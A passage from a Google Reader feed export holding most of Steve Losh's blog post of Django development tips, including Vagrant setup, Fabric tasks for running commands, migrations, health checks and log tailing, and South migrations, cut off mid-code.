href=\"http://www.jiathis.com/send/?webid=fb&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=@36%E6%B0%AA%C2%BB%20Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;uid=1522335&amp;appkey=\" title=\"Facebook\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/facebook.png\" title=\"Facebook\" alt=\"Facebook\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=twitter&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F%20(via%20@36kr)&amp;pic=&amp;title=%20Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB%20%7C%2036%E6%B0%AA%20&amp;uid=1522335&amp;appkey=\" title=\"Twitter\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/twitter.png\" title=\"Twitter\" alt=\"Twitter\"></a>\n\t<a rel=\"nofollow\" href=\"http://www.jiathis.com/send/?webid=linkedin&amp;url=http%3A%2F%2Fwww.36kr.com%2Fgoogle-page-speed-service%2F&amp;pic=&amp;title=@36%E6%B0%AA%C2%BB%20Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;uid=1522335&amp;appkey=\" title=\"LinkedIn\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/linkedin.png?new\" title=\"LinkedIn\" alt=\"LinkedIn\"></a>\n\t<a rel=\"nofollow\" href=\"mailto:?subject=Google%E6%8E%A8%E5%87%BA%E5%85%8D%E8%B4%B9%E7%9A%84%E3%80%90%E9%A1%B5%E9%9D%A2%E5%8A%A0%E9%80%9F%E6%9C%8D%E5%8A%A1%E3%80%91%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%BF%AB&amp;body=http://www.36kr.com/google-page-speed-service/\" title=\"email\"><img src=\"http://www.36kr.com/wp-content/plugins/sociable/images/email_link.png\" title=\"email\" alt=\"email\"></a>\n<a href=\"http://www.jiathis.com/share/?uid=1522335\"></a><a></a>"
    },
    "author" : "pestwave",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.techcrunchchina.com/?feed=rss2",
      "title" : "36氪 | 关注互联网创业",
      "htmlUrl" : "http://www.36kr.com/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1310623880957",
    "timestampUsec" : "1310623880957446",
    "id" : "tag:google.com,2005:reader/item/c0b5bffff7af0401",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred" ],
    "title" : "Django Advice",
    "published" : 1309422600,
    "updated" : 1309422600,
    "alternate" : [ {
      "href" : "http://feedproxy.google.com/~r/stevelosh/~3/3yBaI0DYSWc/",
      "type" : "text/html"
    } ],
    "canonical" : [ {
      "href" : "http://stevelosh.com/blog/2011/06/django-advice/"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>For the past year and a half or so I’ve been working full-time at <a href=\"http://dwaiter.com/\">Dumbwaiter\nDesign</a> doing <a href=\"http://www.djangoproject.com/\">Django</a> development. I’ve picked up a bunch of useful tricks along\nthe way that help me work, and I figured I’d share them.</p>\n<p>I’m sure there are better ways to do some of the things that I mention.  If you know\nof any feel free to hit me up on <a href=\"http://twitter.com/stevelosh\">Twitter</a> and let me know.</p>\n<p>Also: this entry was written over several months, so if there are inconsistencies let\nme know and I’ll try to fix them.</p>\n<div>\n<ul>\n<li><a href=\"http://stevelosh.com/#vagrant\">Vagrant</a><ul>\n<li><a href=\"http://stevelosh.com/#why-vagrant\">Why Vagrant?</a></li>\n<li><a href=\"http://stevelosh.com/#using-fabric-to-stay-fast-and-automate-everything\">Using Fabric to Stay Fast and Automate Everything</a></li>\n</ul>\n</li>\n<li><a href=\"http://stevelosh.com/#wrangling-databases-with-south\">Wrangling Databases with South</a><ul>\n<li><a href=\"http://stevelosh.com/#useful-fabric-tasks\">Useful Fabric Tasks</a></li>\n</ul>\n</li>\n<li><a href=\"http://stevelosh.com/#watching-for-changes\">Watching for Changes</a><ul>\n<li><a href=\"http://stevelosh.com/#using-the-werkzeug-debugger-with-gunicorn\">Using the Werkzeug Debugger with Gunicorn</a></li>\n<li><a href=\"http://stevelosh.com/#pulling-uploads\">Pulling Uploads</a></li>\n<li><a href=\"http://stevelosh.com/#preventing-accidents\">Preventing Accidents</a></li>\n</ul>\n</li>\n<li><a href=\"http://stevelosh.com/#working-with-third-party-apps\">Working with Third-Party Apps</a><ul>\n<li><a href=\"http://stevelosh.com/#installing-apps-from-repositories\">Installing Apps from Repositories</a></li>\n<li><a href=\"http://stevelosh.com/#mirroring-repositories\">Mirroring Repositories</a></li>\n<li><a href=\"http://stevelosh.com/#using-bcvi-to-edit-files\">Using <span><span>BCVI</span></span> to Edit Files</a></li>\n</ul>\n</li>\n<li><a href=\"http://stevelosh.com/#improving-the-admin-interface\">Improving the Admin Interface</a><ul>\n<li><a href=\"http://stevelosh.com/#enter-grappelli\">Enter Grappelli</a></li>\n<li><a href=\"http://stevelosh.com/#an-ugly-hack-to-show-usable-foreign-key-fields\">An Ugly Hack to Show Usable Foreign Key Fields</a></li>\n</ul>\n</li>\n<li><a href=\"http://stevelosh.com/#using-django-annoying\">Using Django-Annoying</a><ul>\n<li><a href=\"http://stevelosh.com/#the-render_to-decorator\">The render_to Decorator</a></li>\n<li><a href=\"http://stevelosh.com/#the-ajax_request-decorator\">The ajax_request Decorator</a></li>\n</ul>\n</li>\n<li><a href=\"http://stevelosh.com/#templating-tricks\">Templating Tricks</a><ul>\n<li><a href=\"http://stevelosh.com/#null-checks-and-fallbacks\">Null Checks and Fallbacks</a></li>\n<li><a href=\"http://stevelosh.com/#manipulating-query-strings\">Manipulating Query Strings</a></li>\n<li><a href=\"http://stevelosh.com/#satisfying-your-designer-with-typogrify\">Satisfying Your Designer with Typogrify</a></li>\n</ul>\n</li>\n<li><a href=\"http://stevelosh.com/#the-flat-page-trainwreck\">The Flat Page Trainwreck</a></li>\n<li><a href=\"http://stevelosh.com/#editing-with-vim\">Editing with Vim</a><ul>\n<li><a href=\"http://stevelosh.com/#vim-for-django\">Vim for Django</a></li>\n<li><a href=\"http://stevelosh.com/#filetype-mappings\">Filetype Mappings</a></li>\n<li><a href=\"http://stevelosh.com/#python-sanity-checking\">Python Sanity Checking</a></li>\n<li><a href=\"http://stevelosh.com/#javascript-sanity-checking-and-folding\">Javascript Sanity Checking and Folding</a></li>\n<li><a href=\"http://stevelosh.com/#django-autocommands\">Django Autocommands</a></li>\n</ul>\n</li>\n<li><a href=\"http://stevelosh.com/#conclusion\">Conclusion</a></li>\n</ul>\n</div>\n<h2>Vagrant</h2>\n<p>I used to develop Django sites by running them on my <span><span>OS</span></span> X laptop locally and\ndeploying to a Linode <span><span>VPS</span></span>.  I had a whole section of this post written up about\ntricks and tips for working with that setup.</p>\n<p>Then I found <a href=\"http://vagrantup.com/\">Vagrant</a>.</p>\n<p>I just deleted the entire section of this post I wrote.</p>\n<p>Vagrant gives you a better way of working.  You need to use it.</p>\n<h3>Why Vagrant?</h3>\n<p>If you haven’t used it before, Vagrant is basically a tool for managing\n<a href=\"http://www.virtualbox.org/\">VirtualBox</a> VMs.  It makes it easy to start, pause, and resume VMs.  Instead of\ninstalling Django in a virtualenv and developing against that, you run a <span><span>VM</span></span> which\nruns your site and develop against that.</p>\n<p>This may not sound like much, but it’s kind of a big deal.  The critical difference\nis that you can now develop against the same setup that you’ll be using in production.</p>\n<p>This cuts out a huge amount of pain that stems from <span><span>OS</span></span> differences.  Here are a few\nexamples off the top of my head:</p>\n<ul>\n<li>URLField and MacPorts Python 2.5 on <span><span>OS</span></span> X.  There’s a <a href=\"https://trac.macports.org/ticket/24421\">bug</a> where using\n  verify_exists will crash your site every time you save a model, unless you set\n  a particular environment variable with no debug information.  Yeah, I spent\n  a couple of hours tracking that one down at work. Awesome.</li>\n<li>Installing <span><span>PIL</span></span> on <span><span>OS</span></span> X is no picnic.  <a href=\"http://mxcl.github.com/homebrew/\">homebrew</a> makes things better, if you use it,\n  so this one isn’t a huge deal.</li>\n<li>Every time you update Python in-place on your local machines, <span><span>ALL</span></span> of your\n  virtualenvs break because the Python binaries inside are linked against global\n  Python library files.  Have fun recreating them.  I hope you froze your\n  <code>requirements.txt</code> files before you updated.</li>\n</ul>\n<p>Using Vagrant and VMs means you can just worry about <span><span>ONE</span></span> operating system and its\nquirks.  It saves you a ton of time.</p>\n<p>Aside from that, there’s another benefit to using Vagrant: it strongly encourages you\nto learn and use an automated provisioning system.  Support for Puppet and Chef is\nbuilt in.  I chose Puppet, but if you prefer Chef that’s cool too.</p>\n<p>You can also use other tools like Fabric or some simple scripts, but I’d strongly\nrecommend giving Puppet or Chef a fair shot.  It’s a lot to learn, but they’re both\nwidely tested and very powerful.</p>\n<p>Because you’re developing against a <span><span>VM</span></span> and deploying to a <span><span>VM</span></span>, you can reuse 90% of\nthe provisioning code across the two.</p>\n<p>When I make a new site, I do the following to initialize a new Vagrant <span><span>VM</span></span>:</p>\n<ol>\n<li><code>vagrant up</code> (which runs Puppet to initialize the <span><span>VM</span></span>)</li>\n<li><code>fab dev bootstrap</code></li>\n</ol>\n<p>When I’m ready to go live, I do the following:</p>\n<ol>\n<li>Buy a Linode <span><span>VPS</span></span>.</li>\n<li>Run Puppet to initialize the <span><span>VPS</span></span>.</li>\n<li>Enter the Linode info in my fabfile.</li>\n<li><code>fab prod bootstrap</code></li>\n</ol>\n<p>No more screwing around with different paths, different versions of Nginx, different\nversions of Python.  When I’m developing something I can be pretty confident it will\n“just work” in production without any major surprises.</p>\n<h3>Using Fabric to Stay Fast and Automate Everything</h3>\n<p>One of the problems with this setup is that I can’t just run <code>python manage.py\nwhatever</code> any more because I need it to run on the <span><span>VM</span></span>.</p>\n<p>To get around this I’ve created many simple <a href=\"http://fabfile.org/\">Fabric</a> tasks to automate the common\nthings I need to do.  Fabric is an awesome little Python utility for scripting tasks\n(like deployments).  We use it constantly at Dumbwaiter.  Here are a few examples\nfrom our fabfiles.</p>\n<p>This first set is for running abitrary commands easily.</p>\n<p><code>cmd</code> and <code>vcmd</code> will <code>cd</code> into the site directory on the <span><span>VM</span></span> and run a command of my\nchoosing.  <code>vcmd</code> will prefix the command with the path to the virtualenv’s <code>bin</code>\ndirectory, so I can do something like <code>fab dev vcmd</code>, <code>pip install markdown</code>.</p>\n<p>The <code>sdo</code> commands do the same thing, but <code>sudo</code>‘ed.</p>\n<div><pre><span>def</span> <span>cmd</span><span>(</span><span>cmd</span><span>=</span><span>&quot;&quot;</span><span>):</span>\n    <span>&#39;&#39;&#39;Run a command in the site directory.  Usable from other commands or the <span><span>CLI</span></span>.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n\n    <span>if</span> <span>not</span> <span>cmd</span><span>:</span>\n        <span>sys</span><span>.</span><span>stdout</span><span>.</span><span>write</span><span>(</span><span>_cyan</span><span>(</span><span>&quot;Command to run: &quot;</span><span>))</span>\n        <span>cmd</span> <span>=</span> <span>raw_input</span><span>()</span><span>.</span><span>strip</span><span>()</span>\n\n    <span>if</span> <span>cmd</span><span>:</span>\n        <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n            <span>run</span><span>(</span><span>cmd</span><span>)</span>\n\n<span>def</span> <span>sdo</span><span>(</span><span>cmd</span><span>=</span><span>&quot;&quot;</span><span>):</span>\n    <span>&#39;&#39;&#39;Sudo a command in the site directory.  Usable from other commands or the <span><span>CLI</span></span>.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n\n    <span>if</span> <span>not</span> <span>cmd</span><span>:</span>\n        <span>sys</span><span>.</span><span>stdout</span><span>.</span><span>write</span><span>(</span><span>_cyan</span><span>(</span><span>&quot;Command to run: sudo &quot;</span><span>))</span>\n        <span>cmd</span> <span>=</span> <span>raw_input</span><span>()</span><span>.</span><span>strip</span><span>()</span>\n\n    <span>if</span> <span>cmd</span><span>:</span>\n        <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n            <span>sudo</span><span>(</span><span>cmd</span><span>)</span>\n\n<span>def</span> <span>vcmd</span><span>(</span><span>cmd</span><span>=</span><span>&quot;&quot;</span><span>):</span>\n    <span>&#39;&#39;&#39;Run a virtualenv-based command in the site directory.  Usable from other commands or the <span><span>CLI</span></span>.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n\n    <span>if</span> <span>not</span> <span>cmd</span><span>:</span>\n        <span>sys</span><span>.</span><span>stdout</span><span>.</span><span>write</span><span>(</span><span>_cyan</span><span>(</span><span>&quot;Command to run: </span><span>%s</span><span>/bin/&quot;</span> <span>%</span> <span>env</span><span>.</span><span>venv_path</span><span>.</span><span>rstrip</span><span>(</span><span>&#39;/&#39;</span><span>)))</span>\n        <span>cmd</span> <span>=</span> <span>raw_input</span><span>()</span><span>.</span><span>strip</span><span>()</span>\n\n    <span>if</span> <span>cmd</span><span>:</span>\n        <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n            <span>run</span><span>(</span><span>env</span><span>.</span><span>venv_path</span><span>.</span><span>rstrip</span><span>(</span><span>&#39;/&#39;</span><span>)</span> <span>+</span> <span>&#39;/bin/&#39;</span> <span>+</span> <span>cmd</span><span>)</span>\n\n<span>def</span> <span>vsdo</span><span>(</span><span>cmd</span><span>=</span><span>&quot;&quot;</span><span>):</span>\n    <span>&#39;&#39;&#39;Sudo a virtualenv-based command in the site directory.  Usable from other commands or the <span><span>CLI</span></span>.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n\n    <span>if</span> <span>not</span> <span>cmd</span><span>:</span>\n        <span>sys</span><span>.</span><span>stdout</span><span>.</span><span>write</span><span>(</span><span>_cyan</span><span>(</span><span>&quot;Command to run: sudo </span><span>%s</span><span>/bin/&quot;</span> <span>%</span> <span>env</span><span>.</span><span>venv_path</span><span>.</span><span>rstrip</span><span>(</span><span>&#39;/&#39;</span><span>)))</span>\n        <span>cmd</span> <span>=</span> <span>raw_input</span><span>()</span><span>.</span><span>strip</span><span>()</span>\n\n    <span>if</span> <span>cmd</span><span>:</span>\n        <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n            <span>sudo</span><span>(</span><span>env</span><span>.</span><span>venv_path</span><span>.</span><span>rstrip</span><span>(</span><span>&#39;/&#39;</span><span>)</span> <span>+</span> <span>&#39;/bin/&#39;</span> <span>+</span> <span>cmd</span><span>)</span>\n</pre></div>\n\n\n<p>This next set is just some common commands that I need to run often.</p>\n<div><pre><span>def</span> <span>syncdb</span><span>():</span>\n    <span>&#39;&#39;&#39;Run syncdb.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span>run</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py syncdb --noinput&#39;</span><span>))</span>\n\n<span>def</span> <span>collectstatic</span><span>():</span>\n    <span>&#39;&#39;&#39;Collect static media.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span>sudo</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py collectstatic --noinput&#39;</span><span>))</span>\n\n<span>def</span> <span>rebuild_index</span><span>():</span>\n    <span>&#39;&#39;&#39;Rebuild the search index.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;process_owner&#39;</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span>sudo</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py rebuild_index&#39;</span><span>))</span>\n        <span>sudo</span><span>(</span><span>&#39;chown -R </span><span>%s</span><span> .xapian&#39;</span> <span>%</span> <span>env</span><span>.</span><span>process_owner</span><span>)</span>\n\n<span>def</span> <span>update_index</span><span>():</span>\n    <span>&#39;&#39;&#39;Update the search index.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;process_owner&#39;</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span>sudo</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py update_index&#39;</span><span>))</span>\n        <span>sudo</span><span>(</span><span>&#39;chown -R </span><span>%s</span><span> .xapian&#39;</span> <span>%</span> <span>env</span><span>.</span><span>process_owner</span><span>)</span>\n</pre></div>\n\n\n<p>We also use Fabric to automate some of the more complex things we need to do.</p>\n<p>This task <code>curl</code>‘s the site’s home page to make sure we haven’t completely borked\nthings.  We use it in lots of other tasks as a sanity check.</p>\n<div><pre><span>def</span> <span>check</span><span>():</span>\n    <span>&#39;&#39;&#39;Check that the home page of the site returns an <span><span>HTTP</span></span> 200.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_url&#39;</span><span>)</span>\n\n    <span>print</span><span>(</span><span>&#39;Checking site status...&#39;</span><span>)</span>\n\n    <span>if</span> <span>not</span> <span>&#39;200 <span><span>OK</span></span>&#39;</span> <span>in</span> <span>local</span><span>(</span><span>&#39;curl --silent -I &quot;</span><span>%s</span><span>&quot;&#39;</span> <span>%</span> <span>env</span><span>.</span><span>site_url</span><span>,</span> <span>capture</span><span>=</span><span>True</span><span>):</span>\n        <span>_sad</span><span>()</span>\n    <span>else</span><span>:</span>\n        <span>_happy</span><span>()</span>\n</pre></div>\n\n\n<p>The <code>_happy</code> and <code>_sad</code> functions just print out some simple messages to get our attention:</p>\n<div><pre><span>from</span> <span>fabric.colors</span> <span>import</span> <span>red</span><span>,</span> <span>green</span>\n\n<span>def</span> <span>_happy</span><span>():</span>\n    <span>print</span><span>(</span><span>green</span><span>(</span><span>&#39;</span><span>\\n</span><span>Looks good from here!</span><span>\\n</span><span>&#39;</span><span>))</span>\n\n<span>def</span> <span>_sad</span><span>():</span>\n    <span>print</span><span>(</span><span>red</span><span>(</span><span>r&#39;&#39;&#39;</span>\n<span>          ___           ___</span>\n<span>         /  /\\         /__/\\</span>\n<span>        /  /::\\        \\  \\:\\</span>\n<span>       /  /:/\\:\\        \\__\\:\\</span>\n<span>      /  /:/  \\:\\   ___ /  /::\\</span>\n<span>     /__/:/ \\__\\:\\ /__/\\  /:/\\:\\</span>\n<span>     \\  \\:\\ /  /:/ \\  \\:\\/:/__\\/</span>\n<span>      \\  \\:\\  /:/   \\  \\::/</span>\n<span>       \\  \\:\\/:/     \\  \\:\\</span>\n<span>        \\  \\::/       \\  \\:\\</span>\n<span>         \\__\\/         \\__\\/</span>\n<span>          ___           ___           ___           ___</span>\n<span>         /__/\\         /  /\\         /  /\\         /  /\\     ___</span>\n<span>         \\  \\:\\       /  /::\\       /  /:/_       /  /:/_   /__/\\</span>\n<span>          \\  \\:\\     /  /:/\\:\\     /  /:/ /\\     /  /:/ /\\  \\  \\:\\</span>\n<span>      _____\\__\\:\\   /  /:/  \\:\\   /  /:/ /:/_   /  /:/ /::\\  \\  \\:\\</span>\n<span>     /__/::::::::\\ /__/:/ \\__\\:\\ /__/:/ /:/ /\\ /__/:/ /:/\\:\\  \\  \\:\\</span>\n<span>     \\  \\:\\~~\\~~\\/ \\  \\:\\ /  /:/ \\  \\:\\/:/ /:/ \\  \\:\\/:/~/:/   \\  \\:\\</span>\n<span>      \\  \\:\\  ~~~   \\  \\:\\  /:/   \\  \\::/ /:/   \\  \\::/ /:/     \\__\\/</span>\n<span>       \\  \\:\\        \\  \\:\\/:/     \\  \\:\\/:/     \\__\\/ /:/          __</span>\n<span>        \\  \\:\\        \\  \\::/       \\  \\::/        /__/:/          /__/\\</span>\n<span>         \\__\\/         \\__\\/         \\__\\/         \\__\\/           \\__\\/</span>\n\n<span>         Something seems to have gone wrong!</span>\n<span>         You should probably take a look at that.</span>\n<span>    &#39;&#39;&#39;</span><span>))</span>\n</pre></div>\n\n\n<p>This one is for when <code>python manage.py reset APP</code> is broken because you’ve changed\nsome <code>db_column</code> names and Django chokes because of some constraits and you just want\nto <strong>reset the fucking app</strong>.</p>\n<p>It’s the “<span><span>NUKE</span></span> <span><span>IT</span></span> <span><span>FROM</span></span> <span><span>ORBIT</span></span>!!” option.</p>\n<div><pre><span>def</span> <span>KILL_IT_WITH_FIRE</span><span>(</span><span>app</span><span>):</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span># Generate and download the reset <span><span>SQL</span></span>.</span>\n        <span>sudo</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py sqlreset </span><span>%s</span><span> &gt; reset.orig.sql&#39;</span> <span>%</span> <span>app</span><span>))</span>\n        <span>get</span><span>(</span><span>&#39;reset.orig.sql&#39;</span><span>)</span>\n\n        <span>with</span> <span>open</span><span>(</span><span>&#39;reset.sql&#39;</span><span>,</span> <span>&#39;w&#39;</span><span>)</span> <span>as</span> <span>f</span><span>:</span>\n            <span>with</span> <span>open</span><span>(</span><span>&#39;reset.orig.sql&#39;</span><span>)</span> <span>as</span> <span>orig</span><span>:</span>\n                <span># Step through the first chunk of the file (the &quot;drop&quot; part).</span>\n                <span>line</span> <span>=</span> <span>orig</span><span>.</span><span>readline</span><span>()</span>\n                <span>while</span> <span>not</span> <span>line</span><span>.</span><span>startswith</span><span>(</span><span>&#39;<span><span>CREATE</span></span>&#39;</span><span>):</span>\n                    <span>if</span> <span>&#39;<span><span>CONSTRAINT</span></span>&#39;</span> <span>in</span> <span>line</span><span>:</span>\n                        <span># Don&#39;t write out <span><span>CONSTRAINT</span></span> lines.</span>\n                        <span># They&#39;re a problem when you change db_colum names.</span>\n                        <span>pass</span>\n                    <span>elif</span> <span>&#39;<span><span>DROP</span></span> <span><span>TABLE</span></span>&#39;</span> <span>in</span> <span>line</span><span>:</span>\n                        <span># Cascade drops.</span>\n                        <span># Hence with &quot;with fire&quot; part of this task&#39;s name.</span>\n                        <span>line</span> <span>=</span> <span>line</span><span>[:</span><span>-</span><span>2</span><span>]</span> <span>+</span> <span>&#39; <span><span>CASCADE</span></span>;</span><span>\\n</span><span>&#39;</span>\n                        <span>f</span><span>.</span><span>write</span><span>(</span><span>line</span><span>)</span>\n                    <span>else</span><span>:</span>\n                        <span># Write other lines through untoched.</span>\n                        <span>f</span><span>.</span><span>write</span><span>(</span><span>line</span><span>)</span>\n                    <span>line</span> <span>=</span> <span>orig</span><span>.</span><span>readline</span><span>()</span>\n\n                <span># Write out the rest of the file untouched.</span>\n                <span>f</span><span>.</span><span>write</span><span>(</span><span>line</span><span>)</span>\n                <span>f</span><span>.</span><span>write</span><span>(</span><span>orig</span><span>.</span><span>read</span><span>())</span>\n\n    <span># Upload the processed <span><span>SQL</span></span> file.</span>\n    <span>put</span><span>(</span><span>&#39;reset.sql&#39;</span><span>,</span> <span>os</span><span>.</span><span>path</span><span>.</span><span>join</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>,</span> <span>&#39;reset.ready.sql&#39;</span><span>),</span> <span>use_sudo</span><span>=</span><span>True</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span># Use the <span><span>SQL</span></span> to reset the app, and fake a migration.</span>\n        <span>run</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py dbshell &lt; reset.ready.sql&#39;</span><span>))</span>\n        <span>sudo</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py migrate --fake --delete-ghost-migrations &#39;</span> <span>+</span> <span>app</span><span>))</span>\n</pre></div>\n\n\n<p>This task uses Mercurial’s local tags to add a <code>production</code> or <code>staging</code> tag in your local\nrepository, so you can easy see where the production/staging servers are at\ncompared to your local repo.</p>\n<div><pre><span>def</span> <span>retag</span><span>():</span>\n    <span>&#39;&#39;&#39;Check which revision the site is at and update the local tag.</span>\n\n<span>    Useful if someone else has deployed (which makes your production/staging local</span>\n<span>    tag incorrect.</span>\n<span>    &#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>,</span> <span>provided_by</span><span>=</span><span>[</span><span>&#39;prod&#39;</span><span>,</span> <span>&#39;stag&#39;</span><span>])</span>\n    <span>require</span><span>(</span><span>&#39;env_name&#39;</span><span>,</span> <span>provided_by</span><span>=</span><span>[</span><span>&#39;prod&#39;</span><span>,</span> <span>&#39;stag&#39;</span><span>])</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span>current</span> <span>=</span> <span>run</span><span>(</span><span>&#39;hg id --rev . --quiet&#39;</span><span>)</span><span>.</span><span>strip</span><span>(</span><span>&#39; </span><span>\\n</span><span>+&#39;</span><span>)</span>\n\n    <span>local</span><span>(</span><span>&#39;hg tag --local --force </span><span>%s</span><span> --rev </span><span>%s</span><span>&#39;</span> <span>%</span> <span>(</span><span>env</span><span>.</span><span>env_name</span><span>,</span> <span>current</span><span>))</span>\n</pre></div>\n\n\n<p>This task tails the Gunicorn logs on the server so you can quickly find out what’s\nhappening when things blow up.</p>\n<div><pre><span>def</span> <span>tailgun</span><span>(</span><span>follow</span><span>=</span><span>&#39;&#39;</span><span>):</span>\n    <span>&quot;&quot;&quot;Tail the Gunicorn log file.&quot;&quot;&quot;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span>if</span> <span>follow</span><span>:</span>\n            <span>run</span><span>(</span><span>&#39;tail -f .gunicorn.log&#39;</span><span>)</span>\n        <span>else</span><span>:</span>\n            <span>run</span><span>(</span><span>&#39;tail .gunicorn.log&#39;</span><span>)</span>\n</pre></div>\n\n\n<p>We’ve got a lot of other tasks but they’re pretty specific to our setup.</p>\n<h2>Wrangling Databases with South</h2>\n<p>If you’re not using <a href=\"http://south.aeracode.org/\">South</a>, you need to start. Now.</p>\n<p>No, really, I’ll wait.  Take 30 minutes, try the <a href=\"http://south.aeracode.org/docs/tutorial/index.html\">tutorial</a>, wrap your head\naround it and come back.  It’s far more important than this blog post.</p>\n<h3>Useful Fabric Tasks</h3>\n<p>South is awesome but its commands are very long-winded.  Here’s the set of fabric\ntasks I use to save quite a bit of typing:</p>\n<div><pre><span>def</span> <span>migrate</span><span>(</span><span>args</span><span>=</span><span>&#39;&#39;</span><span>):</span>\n    <span>&#39;&#39;&#39;Run any needed migrations.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span>sudo</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py migrate &#39;</span> <span>+</span> <span>args</span><span>))</span>\n\n<span>def</span> <span>migrate_fake</span><span>(</span><span>args</span><span>=</span><span>&#39;&#39;</span><span>):</span>\n    <span>&#39;&#39;&#39;Run any needed migrations with --fake.&#39;&#39;&#39;</span>\n    <span>require</span><span>(</span><span>&#39;site_path&#39;</span><span>)</span>\n    <span>require</span><span>(</span><span>&#39;venv_path&#39;</span><span>)</span>\n\n    <span>with</span> <span>cd</span><span>(</span><span>env</span><span>.</span><span>site_path</span><span>):</span>\n        <span>sudo</span><span>(</span><span>_python</span><span>(</span><span>&#39;manage.py 